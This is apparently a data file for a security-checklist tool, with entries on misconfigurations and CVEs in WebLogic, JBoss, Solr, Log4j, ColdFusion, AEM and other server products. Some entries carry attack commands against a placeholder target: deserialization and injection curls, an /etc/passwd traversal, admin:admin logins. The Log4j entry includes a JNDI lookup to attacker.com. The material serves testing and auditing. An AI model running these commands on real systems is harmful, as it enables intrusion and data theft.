### CVE-2019-2725 — Deserialization RCE via async response (unauthenticated, Critical)
<!-- id: weblogic-cve-2019-2725 | severity: critical | tags: weblogic, cve, rce, deserialization, unauthenticated -->
Vulnerable: WebLogic Server 10.3.6.0 and 12.1.3.0. Unauthenticated attackers can exploit a Java deserialization vulnerability in the Fusion Middleware /async and /_async endpoints to execute arbitrary OS commands. CVSS 9.8.

**Commands:**
```
curl -X POST https://target.com:7001/_async/AsyncResponseService -H 'Content-Type: text/xml;charset=UTF-8' --data @ysoserial_payload.xml
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2725

### CVE-2023-21839 — Unauthenticated RCE via T3/IIOP protocol (Critical, CVSS 9.8)
<!-- id: weblogic-cve-2023-21839 | severity: critical | tags: weblogic, cve, rce, t3, iiop -->
Vulnerable: WebLogic Server 12.1.3.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0. Unauthenticated attackers can exploit a remote code execution vulnerability via the T3 or IIOP protocols to compromise the server without authentication.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-21839

---

## JBoss / WildFly
<!-- id: jboss | icon: 🛠️ | color: #e06c75 -->
Security checklists for JBoss Application Server and WildFly.

### Check JBoss for exposed admin console and JMX access
<!-- id: jboss-1 | severity: critical | tags: jboss, admin-console, jmx, rce -->
JBoss admin console on port 8080/9990 without authentication allows WAR deployment and direct code execution via JMX MBeans.

**References:**
- https://access.redhat.com/documentation/en-us/jboss_enterprise_application_platform/

### Check JBoss for Java deserialization RCE (CVE-2017-12149)
<!-- id: jboss-2 | severity: critical | tags: jboss, deserialization, rce, cve -->
CVE-2017-12149 allows unauthenticated RCE via Java deserialization in the JBoss HTTP Invoker endpoint (/invoker/readonly).

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12149

### CVE-2015-7501 — Java deserialization RCE via JMX and HTTP Invoker (Critical)
<!-- id: jboss-cve-2015-7501 | severity: critical | tags: jboss, cve, rce, deserialization, jmx -->
Vulnerable: JBoss AS 4.x, 5.x, 6.x. The JMX/RMI interfaces and HTTP Invoker in JBoss allow unauthenticated attackers to send crafted serialized Java objects exploiting Apache Commons Collections gadget chains to achieve RCE. This class of vulnerabilities affected many Java applications simultaneously.

**Commands:**
```
python jboss_exploiter.py --url https://target.com:8080 --payload CommonsCollections1
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7501

---

## SAP NetWeaver
<!-- id: sap | icon: 🛠️ | color: #e06c75 -->
Security checklists for SAP NetWeaver application server and ERP platform.

### Check SAP for RECON unauthenticated admin creation (CVE-2020-6287)
<!-- id: sap-1 | severity: critical | tags: sap, recon, rce, cve -->
CVE-2020-6287 (RECON, CVSS 10.0) allows unauthenticated creation of a high-privilege SAP user via the LM Configuration Wizard in NetWeaver AS Java.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6287

### Check SAP for exposed ICM administrative interface
<!-- id: sap-2 | severity: critical | tags: sap, netweaver, admin, default-creds -->
SAP NetWeaver interfaces with default credentials allow full ERP access and business process manipulation.

**References:**
- https://support.sap.com/en/my-support/knowledge-base/security-notes-news.html

---

## Atlassian Bitbucket
<!-- id: bitbucket | icon: 🛠️ | color: #e06c75 -->
Security checklists for Atlassian Bitbucket source code repository.

### Check Bitbucket for pre-auth RCE (CVE-2022-36804)
<!-- id: bitbucket-1 | severity: critical | tags: bitbucket, rce, command-injection, cve -->
CVE-2022-36804 is a critical command injection in Bitbucket Server and Data Center allowing unauthenticated RCE against instances with any public repository.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36804

---

## Gitea
<!-- id: gitea | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gitea self-hosted Git service.

### Check Gitea for open registration and public repository exposure
<!-- id: gitea-1 | severity: medium | tags: gitea, public-repos, registration, info-disclosure -->
Gitea with open registration and public visibility exposes internal source code and allows attackers to create accounts accessing private organizations.

**References:**
- https://docs.gitea.com/administration/config-cheat-sheet

---

## SonarQube
<!-- id: sonarqube | icon: 🛠️ | color: #e06c75 -->
Security checklists for SonarQube code quality and security analysis platform.

### Check SonarQube for exposed project source code and vulnerability reports
<!-- id: sonarqube-1 | severity: high | tags: sonarqube, source-code, info-disclosure -->
Public SonarQube instances expose full source code analysis, detected vulnerabilities, and secrets found in code to any visitor.

**References:**
- https://docs.sonarqube.org/latest/instance-administration/security/

### Check SonarQube for default admin credentials (admin/admin)
<!-- id: sonarqube-2 | severity: critical | tags: sonarqube, default-creds, unauthorized-access -->
SonarQube defaults to admin/admin, granting access to all project code and webhook configurations.

**References:**
- https://docs.sonarqube.org/latest/instance-administration/security/

---

## Portainer
<!-- id: portainer | icon: 🛠️ | color: #e06c75 -->
Security checklists for Portainer Docker and Kubernetes management UI.

### Check Portainer for exposed admin UI with weak credentials
<!-- id: portainer-1 | severity: critical | tags: portainer, docker, default-creds, container-escape -->
Portainer admin on port 9000/9443 with weak credentials grants full Docker host access. Privileged containers enable host OS escape.

**References:**
- https://docs.portainer.io/admin/settings/general

---

## HashiCorp Vault
<!-- id: vault | icon: 🛠️ | color: #e06c75 -->
Security checklists for HashiCorp Vault secrets management platform.

### Check Vault for unsealed state and root token exposure
<!-- id: vault-1 | severity: critical | tags: vault, root-token, secrets-exposure -->
Vault in unsealed state with exposed root token provides access to all stored secrets, certificates, and dynamic credentials.

**References:**
- https://developer.hashicorp.com/vault/docs/concepts/security-model

---

## MinIO
<!-- id: minio | icon: 🛠️ | color: #e06c75 -->
Security checklists for MinIO high-performance object storage.

### Check MinIO for publicly accessible buckets
<!-- id: minio-1 | severity: critical | tags: minio, public-buckets, data-exposure -->
MinIO buckets with public access policy expose all stored files including backups, application data, and user uploads.

**References:**
- https://min.io/docs/minio/linux/administration/identity-access-management.html

### Check MinIO for default credentials (minioadmin/minioadmin)
<!-- id: minio-2 | severity: critical | tags: minio, default-creds, storage-access -->
MinIO defaults to minioadmin/minioadmin, granting full admin access to all buckets and stored data.

**References:**
- https://min.io/docs/minio/linux/administration/identity-access-management/minio-user-management.html

---

## CouchDB
<!-- id: couchdb | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache CouchDB document database.

### Check CouchDB for Admin Party mode (no authentication configured)
<!-- id: couchdb-1 | severity: critical | tags: couchdb, admin-party, unauthorized-access -->
CouchDB in Admin Party mode allows anyone to create admin accounts, read all databases, and execute OS commands via the config endpoint.

**References:**
- https://docs.couchdb.org/en/stable/intro/security.html

---

## InfluxDB
<!-- id: influxdb | icon: 🛠️ | color: #e06c75 -->
Security checklists for InfluxDB time-series database.

### Check InfluxDB 1.x for unauthenticated query access
<!-- id: influxdb-1 | severity: critical | tags: influxdb, unauthorized-access, data-exposure -->
InfluxDB 1.x with authentication disabled exposes all time-series data via the HTTP query API — commonly containing IoT metrics and infrastructure telemetry.

**References:**
- https://docs.influxdata.com/influxdb/v1/administration/authentication_and_authorization/

---

## Docker Registry
<!-- id: docker-registry | icon: 🛠️ | color: #e06c75 -->
Security checklists for self-hosted Docker container image registry.

### Check Docker Registry for unauthenticated image listing and pull
<!-- id: docker-1 | severity: critical | tags: docker, registry, unauthorized-access, source-code -->
Docker Registry without authentication allows listing all images via /v2/_catalog and pulling any image, exposing source code and secrets in image layers.

**References:**
- https://docs.docker.com/registry/deploying/#restricting-access

---

## Nagios
<!-- id: nagios | icon: 🛠️ | color: #e06c75 -->
Security checklists for Nagios IT infrastructure monitoring platform.

### Check Nagios XI for pre-auth RCE (CVE-2020-35578)
<!-- id: nagios-1 | severity: critical | tags: nagios, rce, cve, command-injection -->
Multiple Nagios XI versions are vulnerable to pre-authentication command injection and RCE — frequently unpatched in enterprise environments.

**References:**
- https://www.nagios.com/products/security/

### Check Nagios for default credentials and infrastructure topology exposure
<!-- id: nagios-2 | severity: high | tags: nagios, default-creds, info-disclosure -->
Nagios with default credentials exposes full infrastructure topology, hostnames, IPs, and service health configurations.

**References:**
- https://assets.nagios.com/downloads/nagiosxi/docs/Nagios_XI_Security_Hardening_Guide.pdf

---

## Redmine
<!-- id: redmine | icon: 🛠️ | color: #e06c75 -->
Security checklists for Redmine open-source project management application.

### Check Redmine for public projects leaking internal data
<!-- id: redmine-1 | severity: medium | tags: redmine, public-projects, info-disclosure -->
Redmine projects set to public expose issue tracker data, internal roadmaps, code repositories, and user account information.

**References:**
- https://www.redmine.org/projects/redmine/wiki/Security

---

## Cacti
<!-- id: cacti | icon: 🛠️ | color: #e06c75 -->
Security checklists for Cacti network graphing and monitoring tool.

### Check Cacti for unauthenticated command injection RCE (CVE-2022-46169)
<!-- id: cacti-1 | severity: critical | tags: cacti, rce, command-injection, cve -->
CVE-2022-46169 allows unauthenticated command injection in Cacti via remote_agent.php — actively exploited against unpatched instances.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-46169

---

## Graylog
<!-- id: graylog | icon: 🛠️ | color: #e06c75 -->
Security checklists for Graylog log management platform.

### Check Graylog for exposed web interface and log data
<!-- id: graylog-1 | severity: high | tags: graylog, unauthorized-access, log-exposure -->
Graylog without authentication exposes all collected logs — commonly containing authentication events, credentials, and API tokens.

**References:**
- https://go2docs.graylog.org/current/securing_graylog/securing_graylog.html

---

## Nexus Repository Manager
<!-- id: nexus | icon: 🛠️ | color: #e06c75 -->
Security checklists for Sonatype Nexus Repository Manager.

### Check Nexus for default credentials and artifact exposure
<!-- id: nexus-1 | severity: high | tags: nexus, default-creds, artifact-exposure -->
Nexus defaults to admin/admin123. Unauthenticated access may expose build artifacts, Java packages with embedded credentials, and compiled binaries.

**References:**
- https://help.sonatype.com/repomanager3/nexus-repository-administration/security

### Check Nexus for EL injection RCE (CVE-2019-7238)
<!-- id: nexus-2 | severity: critical | tags: nexus, el-injection, rce, cve -->
CVE-2019-7238 allows unauthenticated RCE in Nexus Repository Manager 3.x via Expression Language injection in the OrientDB API endpoint.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7238

### CVE-2020-10199 / CVE-2020-10204 — EL injection RCE in Nexus 3.x (Critical)
<!-- id: nexus-cve-2020-10199 | severity: critical | tags: nexus, cve, rce, el-injection, authenticated -->
Vulnerable: Sonatype Nexus Repository Manager 3.x before 3.21.2. Authenticated attackers can inject EL expressions in the Search API endpoints leading to RCE on the Nexus server (CVE-2020-10199). CVE-2020-10204 is a similar issue in the user management UI.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10199

---

## ArgoCD
<!-- id: argocd | icon: 🛠️ | color: #e06c75 -->
Security checklists for Argo CD Kubernetes continuous delivery platform.

### Check ArgoCD for exposed API with default admin password
<!-- id: argocd-1 | severity: critical | tags: argocd, kubernetes, default-creds, secret-access -->
ArgoCD exposed without authentication or with default admin password grants full Kubernetes deployment control and Kubernetes secret read access.

**References:**
- https://argo-cd.readthedocs.io/en/stable/operator-manual/security/

---

## HashiCorp Consul
<!-- id: consul | icon: 🛠️ | color: #e06c75 -->
Security checklists for HashiCorp Consul service mesh and service discovery.

### Check Consul for unauthenticated API access
<!-- id: consul-1 | severity: critical | tags: consul, unauthorized-access, service-discovery, rce -->
Consul HTTP API without ACL tokens exposes the full service registry, KV store (often containing credentials), and allows agent command execution.

**References:**
- https://developer.hashicorp.com/consul/docs/security

---

## etcd
<!-- id: etcd | icon: 🛠️ | color: #e06c75 -->
Security checklists for etcd distributed key-value store (Kubernetes backing store).

### Check etcd for unauthenticated access exposing Kubernetes secrets
<!-- id: etcd-1 | severity: critical | tags: etcd, kubernetes, unauthorized-access, secrets-exposure -->
etcd on port 2379 without TLS client authentication exposes all Kubernetes secrets, service account tokens, and cluster configuration in plaintext.

**References:**
- https://etcd.io/docs/v3.5/op-guide/security/

---

## Apache Solr
<!-- id: apache-solr | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Solr enterprise search platform.

### Check Solr for unauthenticated admin API and query access
<!-- id: solr-1 | severity: high | tags: solr, unauthorized-access, info-disclosure -->
Apache Solr admin UI at /solr/admin/ without authentication exposes all indices, documents, and config, and allows arbitrary query execution.

**References:**
- https://solr.apache.org/guide/solr/latest/deployment-guide/securing-solr.html

### Check Solr for Log4Shell (CVE-2021-44228)
<!-- id: solr-2 | severity: critical | tags: solr, rce, log4shell, cve -->
Solr uses log4j2 and is directly vulnerable to Log4Shell. The DataImportHandler has also historically allowed SSRF and RCE via crafted configurations.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

### CVE-2019-0193 — DataImportHandler RCE via server-side request (Critical)
<!-- id: solr-cve-2019-0193 | severity: critical | tags: solr, cve, rce, dataimporthandler -->
Vulnerable: Apache Solr before 8.2.0. The DataImportHandler (DIH) allows server-side code execution. An attacker with access to the Solr API can modify the data-config.xml via DIH requests to include a malicious ScriptTransformer, leading to arbitrary code execution. Disable DIH if not needed.

**Commands:**
```
curl 'https://target.com:8983/solr/db/dataimport?command=full-import&verbose=false&clean=false&commit=true&debug=true&core=db&dataConfig=<dataConfig><dataSource+type%3d"URLDataSource"/>...'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0193

---

## RabbitMQ
<!-- id: rabbitmq | icon: 🛠️ | color: #e06c75 -->
Security checklists for RabbitMQ open-source message broker.

### Check RabbitMQ management UI for default credentials (guest/guest)
<!-- id: rabbitmq-1 | severity: critical | tags: rabbitmq, default-creds, message-queue -->
RabbitMQ management plugin at port 15672 with default credentials (guest/guest) grants full broker control including publishing messages and modifying vhosts.

**References:**
- https://www.rabbitmq.com/production-checklist.html

---

## Apache ActiveMQ
<!-- id: activemq | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache ActiveMQ message broker.

### Check ActiveMQ for deserialization RCE (CVE-2023-46604)
<!-- id: activemq-1 | severity: critical | tags: activemq, deserialization, rce, cve -->
CVE-2023-46604 allows unauthenticated RCE on ActiveMQ via the OpenWire protocol (port 61616) — widely exploited for ransomware deployment.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46604

### CVE-2022-41678 — RCE via Jolokia agent in ActiveMQ web console (High)
<!-- id: activemq-cve-2022-41678 | severity: high | tags: activemq, cve, rce, jolokia, web-console -->
Vulnerable: Apache ActiveMQ 5.16.5 and earlier; 5.17.3 and earlier. An authenticated attacker with access to the ActiveMQ web console can exploit the Jolokia JMX agent to invoke MBeans and execute arbitrary OS commands. Upgrade to 5.15.16+, 5.16.6+, 5.17.4+, 5.18.0+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41678

---

## JetBrains TeamCity
<!-- id: teamcity | icon: 🛠️ | color: #e06c75 -->
Security checklists for JetBrains TeamCity CI/CD platform.

### Check TeamCity for authentication bypass RCE (CVE-2024-27198)
<!-- id: teamcity-1 | severity: critical | tags: teamcity, auth-bypass, rce, cve -->
CVE-2024-27198 allows unauthenticated authentication bypass in TeamCity On-Premises enabling admin account creation and RCE — exploited by APT29.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27198

---

## Odoo
<!-- id: odoo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Odoo open-source ERP and CRM platform.

### Check Odoo for exposed database manager
<!-- id: odoo-1 | severity: critical | tags: odoo, database-manager, unauthorized-access -->
Odoo database manager at /web/database/manager allows creating, restoring, and deleting databases without authentication when not properly restricted.

**References:**
- https://www.odoo.com/documentation/master/administration/security.html

---

## Dolibarr
<!-- id: dolibarr | icon: 🛠️ | color: #e06c75 -->
Security checklists for Dolibarr open-source ERP and CRM.

### Check Dolibarr for RCE via PHP file creation (CVE-2023-30253)
<!-- id: dolibarr-1 | severity: critical | tags: dolibarr, rce, php-injection, cve -->
CVE-2023-30253 allows authenticated users to create PHP files via the website module, enabling RCE on the underlying server.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30253

---

## Webmin
<!-- id: webmin | icon: 🛠️ | color: #e06c75 -->
Security checklists for Webmin web-based Unix system administration tool.

### Check Webmin for backdoor RCE (CVE-2019-15107)
<!-- id: webmin-1 | severity: critical | tags: webmin, rce, backdoor, cve -->
CVE-2019-15107 is a backdoor in Webmin's official source (versions 1.882-1.921) allowing unauthenticated command execution via the password change form.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107

### CVE-2019-12840 — Authenticated RCE via package manager (High)
<!-- id: webmin-cve-2019-12840 | severity: high | tags: webmin, cve, rce, package-manager, authenticated -->
Vulnerable: Webmin 1.882–1.921. An authenticated attacker with access to the package update module can inject OS commands via the update request, achieving Remote Code Execution on the server.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12840

---

## cPanel / WHM
<!-- id: cpanel | icon: 🛠️ | color: #e06c75 -->
Security checklists for cPanel and WHM web hosting control panels.

### Check cPanel for exposed interfaces on default ports
<!-- id: cpanel-1 | severity: high | tags: cpanel, whm, admin, brute-force -->
cPanel (2083), WHM (2087), and Webmail (2096) with weak credentials compromise all hosted websites, databases, and email on the server.

**References:**
- https://docs.cpanel.net/knowledge-base/security/

---

## Plesk
<!-- id: plesk | icon: 🛠️ | color: #e06c75 -->
Security checklists for Plesk web hosting control panel.

### Check Plesk for exposed admin panel with weak credentials
<!-- id: plesk-1 | severity: high | tags: plesk, admin, brute-force, hosting -->
Plesk admin at port 8443 with weak or default credentials allows managing all hosted websites, databases, and email on the server.

**References:**
- https://docs.plesk.com/en-US/obsidian/administrator-guide/security-settings.73256/

---

## Varnish Cache
<!-- id: varnish | icon: 🛠️ | color: #e06c75 -->
Security checklists for Varnish Cache HTTP accelerator.

### Check for Varnish cache poisoning via unkeyed headers
<!-- id: varnish-1 | severity: high | tags: varnish, cache-poisoning, headers -->
Varnish configurations including user-controlled headers in cached responses without proper VCL hash_data can be exploited for cache poisoning affecting all users.

**References:**
- https://portswigger.net/web-security/web-cache-poisoning

---

## HAProxy
<!-- id: haproxy | icon: 🛠️ | color: #e06c75 -->
Security checklists for HAProxy load balancer and proxy.

### Check HAProxy stats page for public exposure
<!-- id: haproxy-1 | severity: medium | tags: haproxy, stats, info-disclosure -->
HAProxy stats page (/haproxy?stats) when publicly accessible reveals backend server IPs, ports, health status, and traffic metrics aiding internal network mapping.

**References:**
- https://www.haproxy.com/documentation/haproxy-configuration-manual/latest/

---

## OpenVPN Access Server
<!-- id: openvpn | icon: 🛠️ | color: #e06c75 -->
Security checklists for OpenVPN Access Server.

### Check OpenVPN Access Server for default admin credentials
<!-- id: openvpn-1 | severity: critical | tags: openvpn, default-creds, vpn-access -->
OpenVPN Access Server admin UI at port 943 with default credentials (admin/password) grants full VPN user management and network access configuration.

**References:**
- https://openvpn.net/access-server-manual/

---

## Mattermost
<!-- id: mattermost | icon: 🛠️ | color: #e06c75 -->
Security checklists for Mattermost open-source team collaboration platform.

### Check Mattermost for open registration and API exposure
<!-- id: mattermost-1 | severity: medium | tags: mattermost, api, open-registration, info-disclosure -->
Mattermost with open registration or unauthenticated API access may expose internal team channels, messages, and file uploads to unauthorized users.

**References:**
- https://docs.mattermost.com/deploy/security.html

---

## Rocket.Chat
<!-- id: rocket-chat | icon: 🛠️ | color: #e06c75 -->
Security checklists for Rocket.Chat open-source communications platform.

### Check Rocket.Chat for SAML authentication bypass (CVE-2023-28314)
<!-- id: rocketchat-1 | severity: critical | tags: rocket-chat, saml, auth-bypass, cve -->
CVE-2023-28314 allows authentication bypass in Rocket.Chat via crafted SAML responses. Verify SAML signature validation is properly enforced.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-28314

---

## Nextcloud
<!-- id: nextcloud | icon: 🛠️ | color: #e06c75 -->
Security checklists for Nextcloud self-hosted file sync and collaboration platform.

### Check Nextcloud for misconfigured sharing and file exposure
<!-- id: nextcloud-1 | severity: high | tags: nextcloud, file-exposure, sharing -->
Nextcloud with public link sharing and predictable share tokens can expose sensitive documents. Misconfigured permissions may grant broader access than intended.

**References:**
- https://docs.nextcloud.com/server/latest/admin_manual/security_hardening.html

---

## LDAP / Active Directory
<!-- id: ldap | icon: 🛠️ | color: #e06c75 -->
Security checklists for LDAP directory services and Microsoft Active Directory.

### Check for unauthenticated LDAP null bind and user enumeration
<!-- id: ldap-1 | severity: high | tags: ldap, null-bind, user-enum, info-disclosure -->
LDAP servers allowing anonymous (null) bind expose user accounts, groups, email addresses, and organizational structure to unauthenticated enumeration.

**References:**
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

### Check Active Directory for Kerberoasting and AS-REP Roasting
<!-- id: ldap-2 | severity: high | tags: active-directory, kerberoasting, asrep, credential-attack -->
Service accounts with SPNs are vulnerable to Kerberoasting (offline TGS crack). Accounts with Kerberos pre-auth disabled are vulnerable to AS-REP Roasting.

**References:**
- https://attack.mitre.org/techniques/T1558/003/

---

## Node.js
<!-- id: nodejs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Node.js server-side JavaScript applications.

### Check Node.js for prototype pollution vulnerabilities
<!-- id: nodejs-1 | severity: high | tags: nodejs, prototype-pollution, rce -->
Node.js applications using lodash.merge or deepmerge with unsanitized user input are vulnerable to prototype pollution, potentially enabling DoS or RCE.

**References:**
- https://portswigger.net/web-security/prototype-pollution

### Check Node.js for command injection via child_process
<!-- id: nodejs-2 | severity: critical | tags: nodejs, command-injection, rce -->
Node.js applications passing user-controlled input to exec(), spawn(), or execFile() without sanitization are vulnerable to OS command injection.

**References:**
- https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html

---

## GraphQL
<!-- id: graphql | icon: 🛠️ | color: #e06c75 -->
Security checklists for GraphQL API implementations.

### Check GraphQL for introspection enabled in production
<!-- id: graphql-1 | severity: medium | tags: graphql, introspection, info-disclosure -->
GraphQL introspection reveals the complete API schema — all types, queries, mutations, and fields — providing a full attack surface map to any requester.

**References:**
- https://portswigger.net/web-security/graphql

### Check GraphQL for batching attacks and query depth abuse
<!-- id: graphql-2 | severity: high | tags: graphql, batching, dos, brute-force -->
GraphQL without depth limits or batching restrictions allows brute-force via batched mutations and DoS via deeply nested queries.

**References:**
- https://portswigger.net/web-security/graphql/what-is-graphql

---

## Apache Log4j (Log4Shell)
<!-- id: log4j | icon: 🛠️ | color: #e06c75 -->
Security checklists for applications using the Apache Log4j logging library.

### Check for Log4Shell JNDI injection RCE (CVE-2021-44228)
<!-- id: log4j-1 | severity: critical | tags: log4j, log4shell, rce, jndi, cve -->
CVE-2021-44228 allows unauthenticated RCE via JNDI injection in any user-controlled field logged by Log4j 2.x (below 2.15.0). Inject ${jndi:ldap://attacker.com/a} in all input fields including User-Agent and X-Forwarded-For.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

### CVE-2021-45046 — Incomplete fix for Log4Shell (Critical)
<!-- id: log4j-cve-2021-45046 | severity: critical | tags: log4j, cve, rce, jndi, bypass -->
Vulnerable: Log4j 2.15.0 (the initial fix for CVE-2021-44228 was incomplete). Attackers using non-default configurations with Thread Context Map (MDC) input data containing JNDI lookup patterns in certain non-default configurations could achieve RCE or information disclosure. Fixed in Log4j 2.16.0.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046

### CVE-2021-45105 — Infinite recursion DoS in Log4j (High)
<!-- id: log4j-cve-2021-45105 | severity: high | tags: log4j, cve, dos, infinite-recursion -->
Vulnerable: Log4j 2.0-alpha1–2.16.0. Log4j 2 does not protect from uncontrolled recursion from self-referential lookups. An attacker with control over Thread Context Map data can cause the logging process to terminate via stack overflow. Fixed in Log4j 2.17.0.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105

---

## DokuWiki
<!-- id: dokuwiki | icon: 🛠️ | color: #e06c75 -->
Security checklists for DokuWiki flat-file wiki.

### Check DokuWiki for open registration and ACL misconfiguration
<!-- id: dokuwiki-1 | severity: medium | tags: dokuwiki, acl, open-registration, info-disclosure -->
DokuWiki with open registration or @ALL read access exposes all wiki content including internal documentation to unauthenticated visitors.

**References:**
- https://www.dokuwiki.org/security

---

## BookStack
<!-- id: bookstack | icon: 🛠️ | color: #e06c75 -->
Security checklists for BookStack documentation wiki platform.

### Check BookStack for SSRF via image and attachment upload
<!-- id: bookstack-1 | severity: high | tags: bookstack, ssrf, file-upload -->
BookStack has suffered SSRF vulnerabilities via image and attachment upload features, allowing server-side requests to internal network services.

**References:**
- https://github.com/BookStackApp/BookStack/security/advisories

---

## Discourse
<!-- id: discourse | icon: 🛠️ | color: #e06c75 -->
Security checklists for Discourse community discussion platform.

### Check Discourse for exposed user data and private categories via API
<!-- id: discourse-1 | severity: medium | tags: discourse, api, user-enum, info-disclosure -->
Discourse REST API exposes user profiles and post history. Misconfigured visibility settings may leak private category content to unauthenticated requests.

**References:**
- https://meta.discourse.org/t/discourse-security-checklist/

---

## Flowise
<!-- id: flowise | icon: 🛠️ | color: #e06c75 -->
Security checklists for Flowise low-code AI workflow builder.

### Check Flowise for unauthenticated API access
<!-- id: flowise-1 | severity: critical | tags: flowise, unauthorized-access, ai, credentials -->
Flowise without authentication exposes all AI workflows, embedded API keys (OpenAI, database connections), and allows executing arbitrary LLM chains via the API.

**References:**
- https://docs.flowiseai.com/configuration/authorization

---

## MLflow
<!-- id: mlflow | icon: 🛠️ | color: #e06c75 -->
Security checklists for MLflow machine learning lifecycle platform.

### Check MLflow for unauthenticated access to models and artifacts
<!-- id: mlflow-1 | severity: high | tags: mlflow, unauthorized-access, model-theft -->
MLflow without authentication exposes all experiment data, trained model artifacts, and logged parameters to any visitor on the network.

**References:**
- https://mlflow.org/docs/latest/auth/index.html

---

## Postfix Admin
<!-- id: postfixadmin | icon: 🛠️ | color: #e06c75 -->
Security checklists for Postfix Admin mail server management interface.

### Check Postfix Admin for exposed setup page
<!-- id: postfixadmin-1 | severity: critical | tags: postfix, admin, setup, unauthorized-access -->
Postfix Admin setup.php left accessible allows creating superadmin accounts without authentication. Remove or protect it immediately after initial setup.

**References:**
- https://postfixadmin.github.io/postfixadmin/

---

## Adobe ColdFusion
<!-- id: coldfusion | icon: 🛠️ | color: #e06c75 -->
Security checklists for Adobe ColdFusion enterprise CFML platform — commonly targeted in bug bounty programs.

### CVE-2023-26360 — Unauthenticated RCE via ColdFusion WDDX deserialization (Critical)
<!-- id: coldfusion-cve-2023-26360 | severity: critical | tags: coldfusion, cve, rce, deserialization -->
Vulnerable: ColdFusion 2023 GA, 2021 update 5 and below, 2018 update 13 and below. ColdFusion's WDDX deserialization allows unauthenticated remote code execution by sending a crafted WDDX packet to the administrative console or CFIDE endpoints.

**Commands:**
```
curl -v -X POST https://target.com/cfide/administrator/ -d '{"WDDX":{"name":"anything","class":"java.lang.Runtime","arguments":["id"]}}'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26360

### CVE-2010-2861 — Unauthenticated LFI via CFIDE directory traversal (Critical)
<!-- id: coldfusion-cve-2010-2861 | severity: critical | tags: coldfusion, cve, lfi, directory-traversal -->
Vulnerable: ColdFusion 8.0.1 and earlier. Directory traversal in the ColdFusion administrative console allows reading arbitrary files by encoding `../` sequences.

**Commands:**
```
curl -v --path-as-is https://target.com/CFIDE/administrator/enter.cfm?locale=../../../../../../../../etc/passwd%00en
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2861

### Check for ColdFusion administrative console exposure
<!-- id: coldfusion-1 | severity: high | tags: coldfusion, admin, exposure -->
Exposed ColdFusion Administrator (/CFIDE/administrator) allows password brute-forcing and access to ColdFusion admin features. Restrict to internal IPs or remove.

**References:**
- https://helpx.adobe.com/coldfusion/security.html

### Check for passwordless RDS access
<!-- id: coldfusion-2 | severity: critical | tags: coldfusion, rds, data-access, misconfiguration -->
ColdFusion RDS (Rapid Development Service) can be enabled without authentication, exposing datasource credentials and allowing SQL queries. Check /CFIDE/main/ide.cfm and port 5500.

**References:**
- https://www.adobe.com/products/coldfusion/security.html

---

## Adobe Experience Manager (AEM)
<!-- id: aem | icon: 🛠️ | color: #e06c75 -->
Security checklists for Adobe Experience Manager enterprise CMS platform — widely deployed in enterprise environments.

### Check for exposed AEM CRX repositories
<!-- id: aem-1 | severity: high | tags: aem, crx, information-disclosure, exposure -->
AEM CRX repositories exposed without authentication at /crx/server, /crx/de or /crx/explorer allow browsing, modifying, and deleting content nodes. Check for default admin:admin credentials.

**Commands:**
```
curl -s https://target.com/crx/server/crx.default/jcr:root/content | head -50
curl -u admin:admin https://target.com/crx/server/crx.default/jcr:root/home
```

**References:**
- https://experienceleague.adobe.com/docs/experience-manager-65/administering/security/security-checklist.html

### CVE-2021-27905 — Reflected XSS in AEM Replication Servlet (Medium)
<!-- id: aem-cve-2021-27905 | severity: medium | tags: aem, cve, xss -->
Vulnerable: AEM 6.5 SP5 and earlier. Reflected XSS vulnerability exists in the Replication servlet, exploitable when the user clicks a crafted link.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27905

### Check for SLING API exposure
<!-- id: aem-2 | severity: high | tags: aem, sling, information-disclosure -->
Apache Sling API servlets may expose sensitive information about the AEM instance, including user lists, component definitions, and configuration details. Check /system/console and /libs endpoints.

**Commands:**
```
curl -s https://target.com/system/console/status-productinfo.json
curl -s https://target.com/libs/granite/core/content/login.html
```

**References:**
- https://sling.apache.org/documentation/the-sling-engine/sling-cheatsheet.html

### Check for AEM DAM path traversal
<!-- id: aem-3 | severity: high | tags: aem, dam, path-traversal -->
AEM DAM (Digital Asset Manager) may allow path traversal when accessing assets. Check if assets can be read outside the intended DAM directories.

**References:**
